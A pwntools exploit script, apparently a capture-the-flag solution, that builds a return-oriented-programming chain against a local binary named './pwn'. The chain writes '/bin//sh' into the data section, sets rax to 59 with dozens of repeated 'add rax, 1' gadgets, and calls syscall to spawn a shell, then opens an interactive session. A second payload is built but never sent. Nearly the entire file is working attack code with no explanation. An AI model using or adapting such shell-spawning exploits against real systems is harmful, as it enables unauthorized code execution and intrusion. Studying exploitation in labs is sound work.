#!/bin/python3
from pwn import *
import sys
from struct import pack

binary = "./pwn"
elf = context.binary = ELF(binary, False)
context.terminal = ["terminator", "-x", "bash", "-c"]
context.log_level  = 'debug'
libc = elf.libc
rop = ROP(elf)

#### GDB Script
script = '''

'''


io = None
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
rr = lambda *a, **k: io.recvregex(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
st = lambda *a, **k: io.sendthen(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
slt = lambda *a, **k: io.sendlinethen(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)

def start(*args, **kwargs):
    usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
    # [ip, port]
    REMOTE = []
    if args:
        arguments = [elf.path]
        arguments.extend(args)
        return process(arguments)

    if not args and not kwargs:
        if len(sys.argv) > 1:
            if sys.argv[1] == 'gdb':
                return gdb.debug(elf.path, gdbscript=script)
            elif sys.argv[1] == 'remote':
                return remote(REMOTE[0], REMOTE[1])
            else:
                print("INVALID ARGUMENT")
                print(usage)
                sys.exit(0)
        else:
            return process(elf.path)


def main():
    global io
    #################### 
    ### EXPLOIT CODE ###
    ####################
    
    io = start()
    pop_rsi = 0x000000000040f4de
    data_section = 0x00000000004c00e0
    mov_rsi_rax = 0x000000000047bcf5

    p = b''

    p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
    p += pack('<Q', 0x00000000004c00e0) # @ .data
    p += pack('<Q', 0x00000000004497d7) # pop rax ; ret
    p += b'/bin//sh'
    p += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
    p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
    p += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
    p += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x000000000040191a) # pop rdi ; ret
    p += pack('<Q', 0x00000000004c00e0) # @ .data
    p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
    p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
    p += pack('<Q', 0x000000000040181f) # pop rdx ; ret
    p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
    p += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004012d3) # syscall

    payload = flat(
        rop.find_gadget(["pop rsi", "ret"])[0],
        data_section,
        rop.find_gadget(["pop rax", "ret"])[0],
        b"/bin//sh",
        mov_rsi_rax,
        rop.find_gadget(["pop rsi", "ret"])[0],
        data_section + 8,
        0x0000000000443e30, # xor rax, rax; ret
        mov_rsi_rax,
        rop.find_gadget(["pop rdi", "ret"])[0],
        data_section,
        rop.find_gadget(["pop rsi", "ret"])[0],
        data_section + 8,
        rop.find_gadget(["pop rdx", "ret"])[0],
        data_section + 8,
        0x0000000000443e30, # xor rax, rax; ret
    )

    for i in range(1, 60):
        payload += p64(0x0000000000470d20) #add rax, 1 ; ret

    payload += p64(0x00000000004012d3) # syscall
    ru("\n")
    sl(p)
    ia()

if __name__ == "__main__":
    main()
